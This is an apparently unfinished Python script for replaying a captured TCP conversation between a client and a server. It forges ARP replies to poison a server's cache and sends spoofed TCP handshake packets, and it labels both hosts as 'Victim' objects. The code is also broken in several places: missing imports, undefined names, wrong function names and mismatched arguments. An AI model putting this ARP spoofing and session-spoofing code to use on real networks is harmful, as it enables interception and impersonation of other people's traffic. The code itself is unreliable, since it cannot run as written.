#!/usr/bin/env python3
import time
import getopt
import sys


def replay_usage(exit_num=None):
    usg = ""
    usg += "[h|help]\t\t: print usage\n"
    usg += "[s|server]\targ\t: the IP address of the server\n"
    usg += "[c|client]\targ\t: the IP address of the client\n"
    usg += "[i|interface]\targ\t: the interface you are listening on\n"
    usg += "[f|file]\targ\t: pcap to read conversation from"

    print(usg)


# spoof arp so that other networks recognize spoofed client
def arp_poison(client, server):
    send(
        ARP(op=2,
            hwsrc=client.mac, psrc=client.ip,
            hwdst=server.mac, pdst=server.ip),
        iface=intface
    )

def t_shake(client, server):
    msg = client.gen_msg()
    
    msg.flags = "S"

    sendp(msg, iface=intface)
    arp_poison()

    t = sniff(iface=intface, count=1, lfilter=lambda x:
              x.haslayer(TCP) and
              x[IP].src == server.ip and
              x[IP].dst == client.ip and
              x[TCP].flags)[0]

    ACK = TCP(sport=49444, dport=61616, flags='A',
              seq=t[TCP].ack, ack=t[TCP].seq + 1)
    sendp(eth / ip / ACK, iface=intface)


# filter pcap for tcp messages from client and server
def pcap_filter(pcaps, client_ip, server_ip):
    c_msg = []
    s_msg = []

    for packet in pcaps:
        if packet[IP].src == client_ip and packet[IP].dst == server_ip:
            c_msg.append(packet)

        elif packet[IP].src == server_ip and packet[IP].dst == client_ip:
            s_msg.append(packet)

    return(c_msg, s_msg)


def tcp_replay(server, client, pcaps, intface):
    c_msg, s_msg = pcap_filter(pcaps, client.ip, server.ip)

    t_shake(client, server, intface)
    


# parsing getopts
def main():
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "hc:s:i:f:",
            ["help", "client", "server", "interface", "file"]
        )

    except getopt.GetoptError as err:
        print("ERROR: {}\n".format(err))
        usage(2)

    for o, a in opts:
        if o in ("-s", "--server"):
            server_ip = a
        elif o in ("-f", "--file"):
            pcaps = filter(lambda x: x.haslayer(TCP), rdpcap(a))
        elif o in ("-c", "--client"):
            client_ip = a
        elif o in ("-i", "--interface"):
            intface = a
        elif o in ("-h", "--help"):
            usage()
        else:
            assert False, "unhandled option"

    if not server_ip or not client_ip or not pcaps or not intface:
        print("ERROR: File, Server, Client and Interface are required\n")
        usage(2)

    client = Victim(pcaps, client_ip)
    server = Victim(pcaps, server_ip)

    client.set_vic(server)

    tcp_replay(client, server, pcaps, intface)


# main call
if __name__ == '__main__':
    main()
